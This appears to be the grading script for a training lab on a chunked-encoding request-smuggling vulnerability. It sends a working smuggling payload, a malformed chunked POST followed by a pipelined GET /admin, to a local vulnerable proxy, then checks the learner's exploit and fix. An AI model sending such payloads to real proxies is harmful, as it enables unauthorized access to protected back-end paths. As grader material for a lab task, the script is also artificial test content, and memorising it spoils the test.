#!/usr/bin/env python3
"""
verify/verify.py -- Verifier otomatis 2 fase untuk lab CVE-2025-65114
(chunked parsing desync ala ATS).

Hanya memakai Python stdlib (tanpa dependency), butuh `docker compose` di host.

Alur:
  FASE 1 (pristine): bangun lab dari definisi rentan, pastikan
      - baseline GET /                        -> 200 halaman publik
      - POST /submit chunked well-formed      -> 200 (fungsi normal)
      - POST /submit chunked jelas-rusak      -> 400 (validasi jalan)
      - serangan referensi (health)           -> POST chunked malformed
        (trigger CVE) diterima, dan request kedua yang di-pipeline
        dieksekusi backend (200 + konten admin)
      - exploit/exploit.py milik learner dijalankan -> mencetak
        STATUS: 200 + SMUGGLED_PATH, dan smuggling ulang oleh verifier
        benar-benar membuat backend mengeksekusi request kedua
  FASE 2 (dengan fix/): bangun ulang proxy dari fix/proxy, pastikan
      - serangan referensi GAGAL              -> request malformed dijawab
        400 dan koneksi diputus (request kedua tak pernah dieksekusi)
      - POST /submit chunked well-formed      -> 200 (fungsi normal utuh)
      - baseline GET /                        -> 200

Deteksi scaffold (tanpa string TODO di file learner):
  - exploit: skrip scaffold me-raise NotImplementedError -> exit 3.
  - fix: isi fix/proxy/chunked.py identik byte-per-byte dengan
    proxy/chunked.py (pristine) -> exit 2.

Exit code: 0 = kedua fase lulus, 1 = gagal, 2 = fase 2 belum dikerjakan,
           3 = fase 1 belum dikerjakan (exploit.py belum ada/belum diisi).
"""
import os
import re
import shutil
import socket
import subprocess
import sys
import time

LAB_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
HOST, PORT = "127.0.0.1", 8080
MARKER = b"ADMIN-SECRET"
MALFORMED_BODY = b"1\r\n\r\n0\r\n\r\n"
PASS, FAIL = "LULUS", "GAGAL"
results = []


def log(msg):
    print(msg, flush=True)


def check(name, ok, detail=""):
    results.append((name, ok))
    log("  [%s] %s%s" % (PASS if ok else FAIL, name, " -- " + detail if detail else ""))
    return ok


def run_compose(args):
    cmd = ["docker", "compose"] + args
    p = subprocess.run(cmd, cwd=LAB_DIR, capture_output=True, text=True, timeout=600)
    if p.returncode != 0:
        log("perintah gagal: %s\n%s" % (" ".join(cmd), p.stderr[-2000:]))
        sys.exit(1)
    return p


def read_response(s):
    data = b""
    while b"\r\n\r\n" not in data:
        chunk = s.recv(65536)
        if not chunk:
            return 0, b""
        data += chunk
    head, _, rest = data.partition(b"\r\n\r\n")
    lines = head.split(b"\r\n")
    try:
        status = int(lines[0].split()[1])
    except (IndexError, ValueError):
        return 0, b""
    headers = {}
    for line in lines[1:]:
        if b":" in line:
            k, v = line.split(b":", 1)
            headers[k.strip().lower()] = v.strip()
    try:
        n = int(headers.get(b"content-length", b"0") or b"0")
    except ValueError:
        n = 0
    while len(rest) < n:
        chunk = s.recv(65536)
        if not chunk:
            break
        rest += chunk
    return status, rest[:n]


def raw_request(payload):
    with socket.create_connection((HOST, PORT), timeout=10) as s:
        s.sendall(payload)
        return read_response(s)


def reference_smuggle(path="/admin"):
    """POST chunked malformed (trigger CVE) + request kedua di-pipeline.

    Kembalikan ((status1, body1), (status2, body2)); (0, b"") jika EOF.
    """
    s = socket.create_connection((HOST, PORT), timeout=10)
    try:
        p1 = (b"POST /submit HTTP/1.1\r\nHost: %s:%d\r\n"
              b"Transfer-Encoding: chunked\r\n\r\n" % (HOST.encode(), PORT))
        p1 += MALFORMED_BODY
        p2 = ("GET %s HTTP/1.1\r\nHost: %s:%d\r\nConnection: close\r\n\r\n"
              % (path, HOST, PORT)).encode()
        s.sendall(p1 + p2)
        r1 = read_response(s)
        try:
            r2 = read_response(s)
        except Exception:
            r2 = (0, b"")
        return r1, r2
    finally:
        s.close()


def wait_up(timeout=150):
    log("menunggu lab siap di %s:%d ..." % (HOST, PORT))
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            st, _ = raw_request(b"GET / HTTP/1.1\r\nHost: x\r\n"
                                b"Connection: close\r\n\r\n")
            if st == 200:
                return True
        except OSError:
            pass
        time.sleep(2)
    return False


def parse_exploit_output(out):
    m_status = re.search(r"^STATUS:\s*(\d{3})\s*$", out, re.MULTILINE)
    m_path = re.search(r"^SMUGGLED_PATH:\s*(\S+)\s*$", out, re.MULTILINE)
    return (m_status.group(1) if m_status else None,
            m_path.group(1) if m_path else None)


def main():
    if shutil.which("docker") is None:
        log("docker tidak ditemukan di PATH. Install Docker dulu lalu jalankan lagi.")
        sys.exit(1)

    log("== bersih-bersih container lama ==")
    run_compose(["-f", "docker-compose.yml", "-f", "docker-compose.fix.yml",
                 "down", "--remove-orphans"])
    run_compose(["down", "--remove-orphans"])

    # ---------- FASE 1 ----------
    log("== FASE 1: membangun lab PRISTINE (rentan) ==")
    run_compose(["up", "--build", "-d"])
    if not wait_up():
        log("lab tidak merespons -- cek `docker compose logs`.")
        sys.exit(1)

    log("-- cek fase 1 --")
    ok = True
    st, _ = raw_request(b"GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
    ok &= check("halaman publik / hidup (200)", st == 200, "dapat %s" % st)
    st, _ = raw_request(b"POST /submit HTTP/1.1\r\nHost: x\r\n"
                        b"Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n"
                        b"5\r\nhello\r\n0\r\n\r\n")
    ok &= check("chunked body well-formed diterima (200)", st == 200,
                "dapat %s" % st)
    st, _ = raw_request(b"POST /submit HTTP/1.1\r\nHost: x\r\n"
                        b"Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n"
                        b"z\r\nabc\r\n0\r\n\r\n")
    ok &= check("chunked body jelas-rusak ditolak (400)", st == 400,
                "dapat %s" % st)

    (s1, _), (s2, b2) = reference_smuggle()
    ref_ok = s1 == 200 and s2 == 200 and MARKER in b2
    ok &= check("lab dalam kondisi rentan (malformed chunked -> smuggling)",
                ref_ok, "dapat status1=%s, status2=%s, marker=%s"
                % (s1, s2, MARKER in b2))
    if not ok:
        log("\nFase 1 GAGAL: lab tidak dalam kondisi rentan. Periksa setup Docker.")
        sys.exit(1)

    exploit_py = os.path.join(LAB_DIR, "exploit", "exploit.py")
    if not os.path.exists(exploit_py):
        log("FASE 1: exploit/exploit.py belum ada -- kerjakan fase 1 dulu.")
        sys.exit(3)
    log("menjalankan exploit/exploit.py milik learner ...")
    try:
        p = subprocess.run([sys.executable, exploit_py],
                           capture_output=True, text=True, timeout=60,
                           cwd=LAB_DIR)
    except subprocess.TimeoutExpired:
        log("FASE 1 GAGAL: exploit/exploit.py melebihi 60 detik (hang?).")
        sys.exit(1)
    out = (p.stdout or "") + "\n" + (p.stderr or "")
    if "NotImplementedError" in out:
        log("FASE 1: exploit/exploit.py masih scaffold (belum diedit) -- "
            "kerjakan fase 1 dulu.")
        sys.exit(3)
    got_status, got_path = parse_exploit_output(out)
    ok1, detail = False, ""
    if not (got_status and got_path):
        detail = ("baris kontrak tak lengkap (STATUS=%s, SMUGGLED_PATH=%s)"
                  % (got_status, got_path))
    else:
        (_, _), (vs2, vb2) = reference_smuggle(got_path)
        ok1 = got_status == "200" and vs2 == 200 and MARKER in vb2
        detail = ("klaim STATUS=%s, verifikasi ulang: status=%s, marker=%s"
                  % (got_status, vs2, MARKER in vb2))
    ok1 = check("exploit learner menyelundupkan request via chunked malformed",
                ok1, detail)
    if not ok1:
        tail = out.strip().splitlines()[-8:]
        if tail:
            log("  output script (maks 8 baris terakhir):")
            for line in tail:
                log("    " + line)
        log("\nFase 1 GAGAL: exploit-mu belum membuktikan chunked smuggling. "
            "Lihat exploit/README.md.")
        sys.exit(1)
    log("FASE 1: LULUS -- exploit learner reproducible dan berhasil.\n")

    # ---------- FASE 2 ----------
    pristine = os.path.join(LAB_DIR, "proxy", "chunked.py")
    fixed = os.path.join(LAB_DIR, "fix", "proxy", "chunked.py")
    if not os.path.exists(fixed):
        log("FASE 2: fix/proxy/chunked.py belum ada -- kerjakan fase 2 dulu.")
        sys.exit(2)
    with open(pristine, "rb") as f:
        pristine_bytes = f.read()
    with open(fixed, "rb") as f:
        fixed_bytes = f.read()
    if pristine_bytes == fixed_bytes:
        log("FASE 2: fix/proxy/chunked.py masih identik dengan pristine "
            "(belum diedit) -- kerjakan fase 2 dulu.")
        sys.exit(2)

    log("== FASE 2: membangun lab dengan FIX ==")
    run_compose(["-f", "docker-compose.yml", "-f", "docker-compose.fix.yml",
                 "up", "--build", "--force-recreate", "-d"])
    if not wait_up():
        log("lab (fix) tidak merespons -- cek `docker compose logs`.")
        sys.exit(1)

    log("-- cek fase 2 --")
    ok = True
    (s1, _), (s2, b2) = reference_smuggle()
    atk_gagal = s1 == 400 and not (s2 == 200 and MARKER in b2)
    ok &= check("serangan chunked smuggling GAGAL (malformed -> 400, "
                "request kedua tak dieksekusi)",
                atk_gagal, "dapat status1=%s, status2=%s, marker=%s"
                % (s1, s2, MARKER in b2))
    st, _ = raw_request(b"POST /submit HTTP/1.1\r\nHost: x\r\n"
                        b"Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n"
                        b"5\r\nhello\r\n0\r\n\r\n")
    ok &= check("chunked body well-formed tetap diterima (200)", st == 200,
                "dapat %s" % st)
    st, _ = raw_request(b"GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
    ok &= check("halaman publik / tetap hidup (200)", st == 200,
                "dapat %s" % st)
    if not ok:
        log("\nFase 2 GAGAL: fix belum menutup serangan atau merusak fungsi normal.")
        sys.exit(1)
    log("FASE 2: LULUS -- fix menutup serangan tanpa merusak fungsi normal.")

    print("\n=== LAB SELESAI: kedua fase LULUS ===")
    print("Stack (dengan fix) masih berjalan di http://localhost:8080.")
    print("./lab.sh stop  -> hentikan | ./lab.sh start -> kembali ke kondisi rentan")
    return 0


if __name__ == "__main__":
    sys.exit(main())
